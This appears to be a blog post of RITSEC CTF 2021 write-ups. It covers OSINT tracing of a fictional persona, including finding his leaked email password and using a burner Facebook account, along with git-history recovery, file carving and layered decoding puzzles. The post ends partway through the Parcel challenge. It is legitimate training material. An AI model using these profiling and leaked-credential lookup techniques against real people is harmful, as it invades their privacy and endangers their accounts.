---
title: "ritsecCTF 2021"
description: "Writeups for problems solved by gp for the 2021 RITSEC CTF competition."
date: 2021-04-11T09:24:19-05:00
type:
 - post
categories:
 - Capture The Flag Writeups
tags:
 - ctfs
---

## Intro

> RITSEC CTF 2021
>
> **When**: Fri, 09 April 2021, 16:00 UTC — Sun, 11 April 2021, 16:00 UTC
>
> **Where**: http://ctf.ritsec.club/
>
> **What**: RITSEC CTF 2021 is a security-focused competition that features the following categories: Bin, OSINT, PWN, Crypto, Forensics, Steganography, and Web. We welcome beginners and more advanced security friends! There will be three brackets: RIT students, other college students, and everyone else.

## Solved
| Intel | Forensics | Web | Stego | Crypto | Misc |
|-------|-----------|-----|-------|--------|------|
| [Finding Geno](#finding-geno) | [1597](#1597) | [Robots](#robots) | [InceptionCTF: Dream 4](#inceptionctf-dream-4) | [Lorem Ipsum](#lorem-ipsum) | [Revision](#revision) |
| [Data Breach](#data-breach) | [BIRDTHIEF: FYSA](#birdthief-fysa) | [Revolution](#revolution) | | | | |
| [APT Interference](#apt-interference) | [Inception CTF: Dream 1](#inception-ctf-dream-1) | [Sessions](#sessions) | | | |
| [Music Signs](#music-signs) | [Inception CTF: Dream 2](#inception-ctf-dream-2) | [DababyWeb](#dababyweb)| | | |
| | [Inception CTF: Dream 3](#inception-ctf-dream-3) | | | | |
| | [Blob](#blob) | | | | |
| | [Parcel](#parcel) | | | | |
| | [PleaseClickAlltheThings 1: BegineersRITSEC.html](#pleaseclickallthethings-1-begineersritsechtml) | | | | |
| | [PleaseClickAlltheThings 2: GandCrab_Ursnif](#pleaseclickallthethings-2-gandcrab_ursnif) | | | | |


## Intel

### Finding Geno
> We know that our missing person’s name is Geno and that he works for a local firm called Bridgewater. What is his last name? (Wrap the answer in RS{})
>
> Author: t0uc4n

DuckDuckGo search for "Geno bridgewater rocheseter" given the info in the description. For me, the very first link was for a "geno ikonomov" entry in LinkedIn.

* https://www.linkedin.com/in/geno-ikonomov

{{< image src="/img/CTFs/2021/ritsecCTF/geno-linkedin.png" alt="geno-linkedin-home.png" >}}

Trying this last name, we get the flag.

Flag is `RS{Ikonomov}`.


### Data Breach
> Oh no! Geno’s email was involved in a data breach! What was his password?
>
> Author: t0uc4n

So, this challenge seems to be playing off the same person from the previous challenge, [Finding Geno](#finding-geno).

As we can see right in their LinkedIn profile, their email is **incogeno@gmail.com**. So we have the email, now we just need to find what the breach was to get the password.

Interestingly, visiting haveibeenpwned.com and inputting their password, it reports "Good news - no pwnage found!", so it seems that this is not the appropriate email we need to use. Back on the linkedin page, there is a link to their "personal website", which is a sort of online business card:

{{< image src="/img/CTFs/2021/ritsecCTF/geno-personal-site.png" alt="geno-personal-site.png" >}}

From here, we have a link to a bunch of social sites:

* [Facebook](https://www.facebook.com/geno.ikonomov)
* [Twitter](https://twitter.com/GenoIkonomov)
* [LinkedIn](https://www.linkedin.com/in/geno-ikonomov)
* [Reddit](https://reddit.com/u/incogeno)
* [Github](https://github.com/incogeno)
* [Soundcloud](https://soundcloud.app.goo.gl/PGBcV)
* [Snapchat](https://snapchat.com/add/incogeno)

The Reddit account is empty, and not archived in wayback machine. The LinkedIn we've already seen. The Github page is empty, and the account has no activity other than having joined on March 16 2021. And the soundcloud account is also empty entirely.

After making a burner FB account, because ffs you need one to see FB content, we see:

{{< image src="/img/CTFs/2021/ritsecCTF/geno-fb.png" alt="geno-fb.png" >}}

So, note:

* Friends with a https://www.facebook.com/claire.alexa.7771
* Friends with a https://www.facebook.com/david.petterton.5 (whose account seems to be empty entirely).
* Has a post about Old Forge, a Drake feels quote picture, and his past education.

Going to their Twitter, we see a bit more content. A most recent post about Old Forge (w/picture), another about visiting grandma along the way (2 more pictures), a tweet about an eagle statue (1 picture), and then two tweets about Hip Hop quotes.

On their most recent tweet, we see some comments from https://twitter.com/eng_claire, which is the same person from their FB of the "troubled relationship".

Other that, still nothing really relevant.

Back to google, searching (explicitly with quotes, to filter exact matches) for "incogeno@gmail.com", we get exactly 1 result:

{{< image src="/img/CTFs/2021/ritsecCTF/geno-pw.png" alt="geno-pw.png" >}}

As we can see in the results: `incogeno@gmail.com:password=StartedFromTheBottom!`

Flag is `RS{StartedFromTheBottom!}`


### APT Interference
> Geno’s ex is speculated to be involved in his disappearance. Try to find some incriminating information on her social media. What nation-state is she working with? (Wrap the answer in RS{})

From the previous challenges, we know that Geno's ex is [Claire Eng](https://twitter.com/eng_claire). In their twitter page, which can be discovered by looking at Geno's most recent tweet's comments, we see a blochain address in the bio:

* `13yTaS2QsQi5Gy9M6cezHmyQtWhj4zW5aY`

Googling for exact matches on the wallet, i.e `"13yTaS2QsQi5Gy9M6cezHmyQtWhj4zW5aY"`, we get one page result:

* https://www.blockchain.com/btc/address/1FsXnPtqRtWs89YtDhFdoZpyt2LUWJDfW1

We can see that the wallet mentioned in Claire's twitter bio recieved some value from this wallet.

Googling for exact matches on this new wallet, i.e `"1FsXnPtqRtWs89YtDhFdoZpyt2LUWJDfW1"`, we see the following results:

{{< image src="/img/CTFs/2021/ritsecCTF/claire-busted.png" alt="claire-busted.png" >}}


... of which, the third link looks like what we want! Searching for "Ackaria Ministry of Finance", we find a oage then mentions "An official website of the Government of Ackaria - the world's first crypto-centric country!".

As such, I tried to submit the flag after this and succeeded.

Flag is `RS{Ackaria}`.

### Music Signs
> Geno occasionally keeps up with his ex’s music interests. What do they say about her personality?
>
> Author: Brendy

From the previous Intel category challenges, we know that there is a Twitter page for Claire Eng which has the url of https://twitter.com/eng_claire.

In the Twitter page's bio, is [a link to a Spotify account for Claire Eng](https://t.co/en0Upor4Uc?amp=1).

Navigating to this link, and then _when logged into Spotify_, you can see one single public playlist, titled "RS".

After staring at this page for too long, I realized that the names of the songs spell out SAGITTARIUS (get it, Music _Signs_, Astrology Signs, ugh)...

{{< image src="/img/CTFs/2021/ritsecCTF/claire-sign.png" alt="claire-sign.png" >}}

&nbsp;

Flag is `RS{SAGITTARIUS}`.

### #OSINTChallenge
> The CEO of Geno’s company loves local art and nature. Where was she when she took the photo in her Twitter background? (Wrap the answer in RS{} and use underscores between each word.)

So, from the first challenge, we know that we have Geno's LinkedIn: [here](https://www.linkedin.com/in/geno-ikonomov). From here, we can see the page for the company, [Bridgewater Investigations](https://www.linkedin.com/company/bridgewater-investigations?trk=public_profile_experience-item_result-card_subtitle-click), and from here it's CEO of the company, [Dr. JoAnne Turner-Frey](https://www.linkedin.com/in/dr-joanne-turner-frey-91b255209?trk=org-employees_profile-result-card_result-card_full-click).

Unfortunately, up till now, we haven't seen any references of this character in any of Geno's social media, nor his ex's, Claire.

I tried looking up "JoAnne Turner-Frey" in Google, but didn't get any reliable hits. Nor did "JoAnne Turner-Frey twitter".

From twitter.com itself, however, searching for the company name, [Bridgewater Investigations](https://twitter.com/search?q=Bridgewater%20Investigations&src=typed_query), we get some results; the fifth of which is from an account for a person named, you bet, **JoAnne Turner-Frey**.

{{< image src="/img/CTFs/2021/ritsecCTF/joanne-twitter.png" alt="joanne-twitter.png" >}}

And from that profile, we can finally see the cover photo:

{{< image src="/img/CTFs/2021/ritsecCTF/joanne-cover.jpeg" alt="joanne-cover.jpeg" >}}

After searching for an hour or two on Google+Yandex, I still couldn't get the location, and decided to give up.

Flag is `???`.


## Forensics
### 1597
> ... as in https://xkcd.com/1597/
>
> http://git.ritsec.club:7000/1597.git/

We're given a website, with a publicly exposed git directory.

Clone it locally:

```bash
git clone http://git.ritsec.club:7000/1597.git/
```

cd into it. We see an empty `flag.txt` file. Checking the git history, we see:

```
git --no-pager log
commit dcc402050827e92dbcf2578e24f2cba76f34229c (HEAD -> master, origin/master, origin/HEAD)
Author: knif3 <knif3@mail.rit.edu>
Date:   Fri Apr 9 05:49:00 2021 +0000

    Updated the flag

commit bb7917f300dd7ba1e5b45055dc802a8e4e3f19e5
Author: knif3 <knif3@mail.rit.edu>
Date:   Fri Apr 9 05:49:00 2021 +0000

    Initial Commit
```

Checkout out the original commit, and cat flag file:

```bash
git checkout bb7917f300dd7ba1e5b45055dc802a8e4e3f19e5

cat flag.txt
Your princess is in another castle
```

OK, slightly larger search:

```bash
git --no-pager rev-list --all | (
    while read revision; do
        git --no-pager grep -F 'RS' $revision
    done
)
```

Which yields the flag:

```
b123f674a07eaf5914eda8845d86b5219fc1de11:flag.txt:RS{git_is_just_a_tre3_with_lots_of_branches}
```

Flag is `RS{git_is_just_a_tre3_with_lots_of_branches}`.

### BIRDTHIEF: FYSA

We're given no description, but an attachment file, which is a PDF.

In the PDF, there is some pages, of which the following seems to be the most important:

{{< image src="/img/CTFs/2021/ritsecCTF/birdthief-cover.png" alt="birdthief-cover.png" >}}

After trying to copy+paste the contents, thinking maybe the text was just in there but covered by the "redaction", I saw that it still did not copy the flag.

This make me thing that the flag was probably a picture underneath the redaction instead.

Using `foremost`, I carved all the files out of the PDF:

```
foremost BIRDTHIEF_FYSA.pdf
```

And in the resulting `output/` directory, we see about two dozen JPEGs. Of which, one is for our flag:

{{< image src="/img/CTFs/2021/ritsecCTF/birdthief-flag.jpeg" alt="birdthief-flag.jpeg" >}}

Flag is `RS{Make_sure_t0_read_the_briefing}`.


### Inception CTF: Dream 1
> The purpose of this CTF challenge is to identify common methods of hiding malicious files and code. In most cases adversaries will attempt to evade defenses in many cases by masquerading, hiding files, and more. There are five directories like the five levels in the movie Inception, Reality -> Van Chase -> The Hotel -> Snow Fortress -> Limbo. You will find one flag in each of the levels, that flag will also be the password to extract the next directory. Requirements: • You must have 7zip installed • Drop the InceptionCTF.7z on the Desktop as “InceptionCTF” • Use the option “Extract to "<name of directory>\” for the CTF to function properly Missing either of the above may result in complications which may cause issues when attempting to find flags.
>
> NOTE: These challenges have a flag format of RITSEC{}
>
> Dream 1: We have to get to their subconscious first, look for a hidden text file within the directory “Reality” this flag will unlock the next directory.

Oh boy, here we go. We are given a 7z file, `InceptionCTFRITSEC.7z`.

Extracting the given folder, we get another archive:

```bash
7z x InceptionCTFRITSEC.7z
7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
p7zip Version 16.02 (locale=en_US.UTF-8,Utf16=on,HugeFiles=on,64 bits,32 CPUs AMD Ryzen 9 3950X 16-Core Processor             (870F10),ASM,AES-NI)

Scanning the drive for archives:
1 file, 160289 bytes (157 KiB)

Extracting archive: InceptionCTFRITSEC.7z
--
Path = InceptionCTFRITSEC.7z
Type = 7z
Physical Size = 160289
Headers Size = 130
Method = LZMA2:192k
Solid = -
Blocks = 1

Everything is Ok

Size:       160149
Compressed: 160289

ls
# created Reality.7z
```

Extracting `Reality.7z`, we find another archive (for the next level), and a text file:

```bash
7z x Reality.7z

7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
p7zip Version 16.02 (locale=en_US.UTF-8,Utf16=on,HugeFiles=on,64 bits,32 CPUs AMD Ryzen 9 3950X 16-Core Processor             (870F10),ASM,AES-NI)

Scanning the drive for archives:
1 file, 160149 bytes (157 KiB)

Extracting archive: Reality.7z
--
Path = Reality.7z
Type = 7z
Physical Size = 160149
Headers Size = 196
Method = LZMA2:192k
Solid = +
Blocks = 1

Everything is Ok

Files: 2
Size:       159943
Compressed: 160149
```

The text file is `Subconscious.txt`:

```bash
cat Subconscious.txt
Wait a minute, whose subconscious are we going into, exactly? {dnalmaerD}CESTIR
```

Which is easily reversed for the lazy using Python:

```python
python -c 'print("{dnalmaerD}CESTIR"[::-1])'
RITSEC}Dreamland{
```

Flag is `RITSEC{Dreamland}`

### Inception CTF: Dream 2
> Note: This challenge builds off Inception CTF: Dream 1,
>
> Unfortunately, the subconscious isn’t enough for this mission, we have to kidnap Fischer we need to go further into the system of the mind. Use the flag found to edit the PowerShell script, entering the Flag in line three in-between the single quotes. Run the PowerShell script and wait for it to complete its actions.
>
> Thanks to SRA for providing this challenge!

From the previous challenge, we know the password for the Van chase zip file for this challenge round is `Dreamland`.

As such, we can extract the level's challenge folder now:

```bash
7z x VanChase.7z

7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
p7zip Version 16.02 (locale=en_US.UTF-8,Utf16=on,HugeFiles=on,64 bits,32 CPUs AMD Ryzen 9 3950X 16-Core Processor             (870F10),ASM,AES-NI)

Scanning the drive for archives:
1 file, 159864 bytes (157 KiB)

Extracting archive: VanChase.7z

Enter password (will not be echoed): <enter "Dreamland">
--
Path = VanChase.7z
Type = 7z
Physical Size = 159864
Headers Size = 264
Method = LZMA2:192k 7zAES
Solid = +
Blocks = 1

Everything is Ok

Files: 3
Size:       159581
Compressed: 159864
```

Which gives us:

```bash
  rw-rw-r--   1   ganondorf   ganondorf      1 KiB   Wed Feb 24 13:26:42 2021    Kicks.ps1
  rw-rw-r--   1   ganondorf   ganondorf    137 B     Wed Feb 24 12:42:31 2021    Kidnap.txt
  rw-rw-r--   1   ganondorf   ganondorf    154 KiB   Wed Feb 24 13:36:06 2021    TheHotel.7z
  rw-rw-r--   1   ganondorf   ganondorf    156 KiB   Fri Apr  9 18:06:28 2021    VanChase.7z
```

Displaying the text file:

```bash
cat Kidnap.txt
An idea is like a virus, resilient, highly contagious.
52 49 54 53 45 43 7b 57 61 74 65 72 55 6e 64 65 72 54 68 65 42 72 69 64 67 65 7d
```

So, just convert the hex numbers to their ASCII equivalent; can do so [using CyberChef, for example](https://gchq.github.io/CyberChef/#recipe=From_Hex('Auto')&input=NTIgNDkgNTQgNTMgNDUgNDMgN2IgNTcgNjEgNzQgNjUgNzIgNTUgNmUgNjQgNjUgNzIgNTQgNjggNjUgNDIgNzIgNjkgNjQgNjcgNjUgN2Q).

Flag is `RITSEC{WaterUnderTheBridge}`.

### Inception CTF: Dream 3
> Note: This challenge builds on Inception CTF: Dream 2.
>
> While the first two steps were easy it’s all hard from here on out, ThePointMan is the most crucial role of the mission he has to be presentable but without giving away our intentions. Use Alternate Dream State to find the flag before the kick.
>
> Author: Brandon Martin

So, from level 2, we already know the password for the 7z for this level is `WaterUnderTheBridge`, so can now extract accordingly:

```bash
7z x TheHotel.7z

7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
p7zip Version 16.02 (locale=en_US.UTF-8,Utf16=on,HugeFiles=on,64 bits,32 CPUs AMD Ryzen 9 3950X 16-Core Processor             (870F10),ASM,AES-NI)

Scanning the drive for archives:
1 file, 158376 bytes (155 KiB)

Extracting archive: TheHotel.7z

Enter password (will not be echoed): <enter "WaterUnderTheBridge">
--
Path = TheHotel.7z
Type = 7z
Physical Size = 158376
Headers Size = 264
Method = LZMA2:192k 7zAES
Solid = +
Blocks = 1

Everything is Ok

Files: 3
Size:       158141
Compressed: 158376
```

Which gives us:

```bash
  rw-rw-r--   1   ganondorf   ganondorf    153 KiB   Wed Feb 24 13:35:31 2021    SnowFortress.7z
  rw-rw-r--   1   ganondorf   ganondorf    154 KiB   Fri Apr  9 18:10:13 2021    TheHotel.7z
  rw-rw-r--   1   ganondorf   ganondorf      1 KiB   Wed Feb 24 13:25:31 2021    ThePointMan.txt
```

Which (**_groans_**) is the following garbage:

```
cat ThePointMan.txt
Q3JlYXRlIGEgbWF6ZSBpbiB0d28gbWludXRlcyB0aGF0IHRha2VzIG1lIG9uZSBtdW5pdGUgdG8gc29sdmUuIA==

59 6f 75 27 72 65 20 77 61 69 74 69 6e 67 20 66 6f 72 20 61 20 74 72 61 69 6e 2c 20 61 20 74 72 61 69 6e 20 74 68 61 74 20 77 69 6c 6c 20 74 61 6b 65 20 79 6f 75 20 66 61 72 20 61 77 61 79 2e 20 59 6f 75 20 6b 6e 6f 77 20 77 68 65 72 65 20 79 6f 75 20 68 6f 70 65 20 74 68 69 73 20 74 72 61 69 6e 20 77 69 6c 6c 20 74 61 6b 65 20 79 6f 75 2c 20 62 75 74 20 79 6f 75 20 63 61 6e 27 74 20 62 65 20 73 75 72 65 2e 20 62 75 74 20 69 74 20 64 6f 65 73 6e 27 74 20 6d 61 74 74 65 72 20 2d 20 62 65 63 61 75 73 65 20 77 65 27 6c 6c 20 62 65 20 74 6f 67 65 74 68 65 72 2e 20

|JP.HPVK.Q.G@.DCWDLA.QJ.AW@DH.GLBB@W	.aDWILKB. BXOR 25

Gung znal qernzf jvguva qernzf vf gbb hafgnoyr!

--. ..- .-.
..-. .-. .-. --.-
--. ..- -. --.
.--- .-.
-.-. -.-- -. .- --. .-. --.-
...- .-
--. ..- ...- ..-.
--.. -. .- .----. ..-.
--.. ...- .- --.-
--.. -. .-..
.--. ..- -. .- - .-.
.-. .. .-. . .-.. --. ..- ...- .- - .-.-.-

No place for a tourist in this job.
```

So, in order of appearance:

* base64:

```bash
echo 'Q3JlYXRlIGEgbWF6ZSBpbiB0d28gbWludXRlcyB0aGF0IHRha2VzIG1lIG9uZSBtdW5pdGUgdG8gc29sdmUuIA==' | base64 -d
Create a maze in two minutes that takes me one munite to solve.
```

* [hex -> ascii](https://gchq.github.io/CyberChef/#recipe=From_Hex('Auto')&input=NTkgNmYgNzUgMjcgNzIgNjUgMjAgNzcgNjEgNjkgNzQgNjkgNmUgNjcgMjAgNjYgNmYgNzIgMjAgNjEgMjAgNzQgNzIgNjEgNjkgNmUgMmMgMjAgNjEgMjAgNzQgNzIgNjEgNjkgNmUgMjAgNzQgNjggNjEgNzQgMjAgNzcgNjkgNmMgNmMgMjAgNzQgNjEgNmIgNjUgMjAgNzkgNmYgNzUgMjAgNjYgNjEgNzIgMjAgNjEgNzcgNjEgNzkgMmUgMjAgNTkgNmYgNzUgMjAgNmIgNmUgNmYgNzcgMjAgNzcgNjggNjUgNzIgNjUgMjAgNzkgNmYgNzUgMjAgNjggNmYgNzAgNjUgMjAgNzQgNjggNjkgNzMgMjAgNzQgNzIgNjEgNjkgNmUgMjAgNzcgNjkgNmMgNmMgMjAgNzQgNjEgNmIgNjUgMjAgNzkgNmYgNzUgMmMgMjAgNjIgNzUgNzQgMjAgNzkgNmYgNzUgMjAgNjMgNjEgNmUgMjcgNzQgMjAgNjIgNjUgMjAgNzMgNzUgNzIgNjUgMmUgMjAgNjIgNzUgNzQgMjAgNjkgNzQgMjAgNjQgNmYgNjUgNzMgNmUgMjcgNzQgMjAgNmQgNjEgNzQgNzQgNjUgNzIgMjAgMmQgMjAgNjIgNjUgNjMgNjEgNzUgNzMgNjUgMjAgNzcgNjUgMjcgNmMgNmMgMjAgNjIgNjUgMjAgNzQgNmYgNjcgNjUgNzQgNjggNjUgNzIgMmUgMjA)

```
You're waiting for a train, a train that will take you far away. You know where you hope this train will take you, but you can't be sure. but it doesn't matter - because we'll be together.
```

* Base58?
* [ROT13](https://gchq.github.io/CyberChef/#recipe=ROT13(true,true,false,13)&input=R3VuZyB6bmFsIHFlcm56ZiBqdmd1dmEgcWVybnpmIHZmIGdiYiBoYWZnbm95ciEK)

```
That many dreams within dreams is too unstable!
```

* [Morse code (and ROT13)](https://gchq.github.io/CyberChef/#recipe=From_Morse_Code('Space','Line%20feed')ROT13(true,true,false,13)&input=LS0uIC4uLSAuLS4KLi4tLiAuLS4gLi0uIC0tLi0KLS0uIC4uLSAtLiAtLS4KLi0tLSAuLS4KLS4tLiAtLi0tIC0uIC4tIC0tLiAuLS4gLS0uLQouLi4tIC4tCi0tLiAuLi0gLi4uLSAuLi0uCi0tLi4gLS4gLi0gLi0tLS0uIC4uLS4KLS0uLiAuLi4tIC4tIC0tLi0KLS0uLiAtLiAuLS4uCi4tLS4gLi4tIC0uIC4tIC0gLi0uCi4tLiAuLiAuLS4gLiAuLS4uIC0tLiAuLi0gLi4uLSAuLSAtIC4tLi0uLQo)

```
THE SEED THAT WE PLANTED IN THIS MAN'S MIND MAY CHANGE EVERYTHING.
```

So nothing there. Though, I just noticed there is also an additional file that I missed from before, as the name of the file is a special character (`<200e>`, which is the "Left to Right mark"):

```
strings ./<200e>
You mean, a dream within a dream? NTIgNDkgNTQgNTMgNDUgNDMgN2IgNDYgNDAgMjEgMjEgNjkgNmUgNjcgNDUgNmMgNjUgNzYgNDAgNzQgNmYgNzIgN2Q=
```

Which then:

```bash
echo NTIgNDkgNTQgNTMgNDUgNDMgN2IgNDYgNDAgMjEgMjEgNjkgNmUgNjcgNDUgNmMgNjUgNzYgNDAgNzQgNmYgNzIgN2Q= | base64 -d
52 49 54 53 45 43 7b 46 40 21 21 69 6e 67 45 6c 65 76 40 74 6f 72 7d
```

Which then [decodes into](https://gchq.github.io/CyberChef/#recipe=From_Hex('Auto')&input=NTIgNDkgNTQgNTMgNDUgNDMgN2IgNDYgNDAgMjEgMjEgNjkgNmUgNjcgNDUgNmMgNjUgNzYgNDAgNzQgNmYgNzIgN2Q) `RITSEC{F@!!ingElev@tor}`.

Flag is `RITSEC{F@!!ingElev@tor}`.

### Blob
> Ha. Blob. Did you get the reference?
>
> http://git.ritsec.club:7000/blob.git/
>
> ~knif3

We are pointed at a website that is a publicly exposed git repo. We can clone it locally like so:

```bash
git clone http://git.ritsec.club:7000/blob.git
cd blob
```

Inside, we see a `flag.txt` file, as well as a README.md file:

```
cat flag.txt
these aren't the droids you're looking for

cat README.md
# Blob

That pesky flag should be around here somewhere...
```

Hmm, OK, so we likely need to find the flag using one of git's utilities (likely relating to _blobs_).

I happened to first check `~/.git/packed-refs`, which lead me to do the following:

```bash
git show-ref
a69cb6306e8b75b6762d6aa1b0279244cacf3f3b refs/heads/master
a69cb6306e8b75b6762d6aa1b0279244cacf3f3b refs/remotes/origin/HEAD
a69cb6306e8b75b6762d6aa1b0279244cacf3f3b refs/remotes/origin/master
d0644363aa853a17c9672cefff587580a43cf45e refs/tags/flag
```

Well, looky looky, `ref/tags/flag`. That looks like what we want. So we need to look at that tag there, like so:

```bash
git --no-pager show --tags --no-patch
RS{refs_can_b3_secret_too}
```

Flag is `RS{refs_can_b3_secret_too}`

### Parcel
> That's a lot of magick
>
> ~knif3

We're given a single file, `Parcel`:

```
file Parcel
Parcel: gzip compressed data, from Unix, original size modulo 2^32 759456
```

So we'll move it to the appropriate suffix:

```bash
mv Parcel Parcel.tgz
```

And then extract:

```bash
7z x Parcel.tgz
```

Which gives us a `Parcel.tar`... which isn't actually a tar?

```bash
file Parcel.tar
Parcel.tar: multipart/mixed; boundary="===============6501672606206171874==", ASCII text, with very long lines
```

OK, what are we working with here then?

```
cat Parcel.tar| head -n 60
Content-Type: multipart/mixed; boundary="===============6501672606206171874=="
MIME-Version: 1.0
Subject: Sun Tzu says....
From: Eskender@gmail.com
To: KathrynSenior988@google.com

--===============6501672606206171874==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit

I. Laying Plans

1. Sun Tzu said: The art of war is of vital importance to the State.
--===============6501672606206171874==
Content-Type: image/png
MIME-Version: 1.0
Content-Transfer-Encoding: base64

iVBORw0KGgoAAAANSUhEUgAAA+gAAAGQAQAAAAAVNnfMAAAABGdBTUEAALGPC/xhBQAAACBjSFJN
AAB6JgAAgIQAAPoAAACA6AAAdTAAAOpgAAA6mAAAF3CculE8AAAAAmJLR0QAAd2KE6QAAAAHdElN
RQflBAkSOAgEM4oMAAAAxUlEQVR42u3NAQkAAAwDoPUvvcU4HC1geil2u91ut9vtdrvdbrfb7Xa7
3W632+12u91ut9vtdrvdbrfb7Xa73W632+12u91ut9vtdrvdbrfb7Xa73W632+12u91ut9vtdrvd
brfb7Xa73W632+12u91ut9vtdrvdbrfb7Xa73W632+12u91ut9vtdrvdbrfb7Xa73W632+12u91u
t9vtdrvdbrfb7Xa73W632+12u91ut9vtdrvdbrfb7Xa73W632+12++t9FESYDx8zamoAAAAldEVY
dGRhdGU6Y3JlYXRlADIwMjEtMDQtMDlUMTg6NTY6MDgrMDA6MDCnDaF3AAAAJXRFWHRkYXRlOm1v
ZGlmeQAyMDIxLTA0LTA5VDE4OjU2OjA4KzAwOjAw1lAZywAAAABJRU5ErkJggg==

--===============6501672606206171874==--
Content-Type: multipart/mixed; boundary="===============8130868917694707556=="
MIME-Version: 1.0
Subject: Sun Tzu says....
From: KM433@comcast.net
To: WulfsigeTash624@yahoo.com

--===============8130868917694707556==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit

I. Laying Plans

2. It is a matter of life and death, a road either to safety or to ruin. Hence it is a subject of inquiry which can on no account be neglected.
--===============8130868917694707556==
Content-Type: image/png
MIME-Version: 1.0
Content-Transfer-Encoding: base64

iVBORw0KGgoAAAANSUhEUgAAA+gAAAGQAQAAAAAVNnfMAAAABGdBTUEAALGPC/xhBQAAACBjSFJN
AAB6JgAAgIQAAPoAAACA6AAAdTAAAOpgAAA6mAAAF3CculE8AAAAAmJLR0QAAd2KE6QAAAAHdElN
RQflBAkSOAgEM4oMAAAAxUlEQVR42u3NAQkAAAwDoPUvvcU4HC1geil2u91ut9vtdrvdbrfb7Xa7
3W632+12u91ut9vtdrvdbrfb7Xa73W632+12u91ut9vtdrvdbrfb7Xa73W632+12u91ut9vtdrvd
brfb7Xa73W632+12u91ut9vtdrvdbrfb7Xa73W632+12u91ut9vtdrvdbrfb7Xa73W632+12u91u
t9vtdrvdbrfb7Xa73W632+12u91ut9vtdrvdbrfb7Xa73W632+12++t9FESYDx8zamoAAAAldEVY
dGRhdGU6Y3JlYXRlADIwMjEtMDQtMDlUMTg6NTY6MDgrMDA6MDCnDaF3AAAAJXRFWHRkYXRlOm1v
ZGlmeQAyMDIxLTA0LTA5VDE4OjU2OjA4KzAwOjAw1lAZywAAAABJRU5ErkJggg==

--===============8130868917694707556==--
Content-Type: multipart/mixed; boundary="===============9046549617560143594=="
MIME-Version: 1.0
...
```

So, we have a bunch of conversations that specify some sort of encoding, and then some associated message.

One "conversation" is grouped like so:

```
Content-Type: multipart/mixed; boundary="===============6501672606206171874=="
MIME-Version: 1.0
Subject: Sun Tzu says....
From: Eskender@gmail.com
To: KathrynSenior988@google.com

--===============6501672606206171874==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit

I. Laying Plans

1. Sun Tzu said: The art of war is of vital importance to the State.
--===============6501672606206171874==
Content-Type: image/png
MIME-Version: 1.0
Content-Transfer-Encoding: base64

iVBORw0KGgoAAAANSUhEUgAAA+gAAAGQAQAAAAAVNnfMAAAABGdBTUEAALGPC/xhBQAAACBjSFJN
AAB6JgAAgIQAAPoAAACA6AAAdTAAAOpgAAA6mAAAF3CculE8AAAAAmJLR0QAAd2KE6QAAAAHdElN
RQflBAkSOAgEM4oMAAAAxUlEQVR42u3NAQkAAAwDoPUvvcU4HC1geil2u91ut9vtdrvdbrfb7Xa7
3W632+12u91ut9vtdrvdbrfb7Xa73W632+12u91ut9vtdrvdbrfb7Xa73W632+12u91ut9vtdrvd
brfb7Xa73W632+12u91ut9vtdrvdbrfb7Xa73W632+12u91ut9vtdrvdbrfb7Xa73W632+12u91u
t9vtdrvdbrfb7Xa73W632+12u91ut9vtdrvdbrfb7Xa73W632+12++t9FESYDx8zamoAAAAldEVY
dGRhdGU6Y3JlYXRlADIwMjEtMDQtMDlUMTg6NTY6MDgrMDA6MDCnDaF3AAAAJXRFWHRkYXRlOm1v
ZGlmeQAyMDIxLTA0LTA5VDE4OjU2OjA4KzAwOjAw1lAZywAAAABJRU5ErkJggg==

--===============6501672606206171874==--
```

So, first it contains an **Content-Type...** line, which specifies a **boundary** value. Then, there's a set of messages, each beginning with a line containing solely that groups boundary indicator. Lastly, it's followed by the boundary indicator, suffixed with two `-`'s.

With the above structure known, we can write a little piece of garbage that just parses out the messages accordingly:

```python
#!/usr/bin/env python3
import re
import base64

def main():
    with open('Parcel.tar', 'r') as infile:
        contents = infile.readlines()
        contents = [x.strip() for x in contents]

    sofar = []
    filenum = 0
    for line in contents:
        if 'Content-Type: multipart/mixed; boundary="===============' in line:
            boundary = line.split("===============")[-1][:-3]

        if f"--==============={boundary}==--" not in line:
                sofar.append(line)
        else:
            sofar.append(line)
            print("======================================================================")
            for i, subline in enumerate(sofar):
                if "Content-Transfer-Encoding: base64" in subline:
                    b64blob = ''.join(sofar[i+2:]).split("--")[0]
                    with open("blob"+str(filenum)+".png", "wb") as outfile:
                        outfile.write(base64.b64decode(b64blob))
            sofar = []
            filenum += 1

if __name__ == '__main__':
    main()
```

Which when run, gives us 130 PNG files:

```bash
ls -alrt
  rwxr-xr-x  136  ganondorf  ganondorf     4 KiB  Fri Apr  9 21:03:50 2021    ./
  rwxr-xr-x    7  ganondorf  ganondorf   224 B    Fri Apr  9 21:04:03 2021    ../
  rw-r--r--    1  ganondorf  ganondorf   741 KiB  Fri Apr  9 21:03:31 2021    Parcel.tar
  rw-r--r--    1  ganondorf  ganondorf     1 KiB  Fri Apr  9 21:03:48 2021    decoder.py
  rw-r--r--    1  ganondorf  ganondorf   445 B    Fri Apr  9 21:03:50 2021    blob0.png
# ...
  rw-r--r--    1  ganondorf  ganondorf   445 B    Fri Apr  9 21:03:50 2021    blob17.png
  rw-r--r--    1  ganondorf  ganondorf   445 B    Fri Apr  9 21:03:50 2021    blob18.png
  rw-r--r--    1  ganondorf  ganondorf   445 B    Fri Apr  9 21:03:50 2021    blob19.png
  rw-r--r--    1  ganondorf  ganondorf   445 B    Fri Apr  9 21:03:50 2021    blob20.png
  rw-r--r--    1  ganondorf  ganondorf   445 B    Fri Apr  9 21:03:50 2021    blob21.png
  rw-r--r--    1  ganondorf  ganondorf     9 KiB  Fri Apr  9 21:03:50 2021    blob22.png
  rw-r--r--    1  ganondorf  ganondorf   445 B    Fri Apr  9 21:03:50 2021    blob23.png
# ...
  rw-r--r--    1  ganondorf  ganondorf   445 B    Fri Apr  9 21:03:50 2021    blob45.png
  rw-r--r--    1  ganondorf  ganondorf   445 B    Fri Apr  9 21:03:50 2021    blob46.png
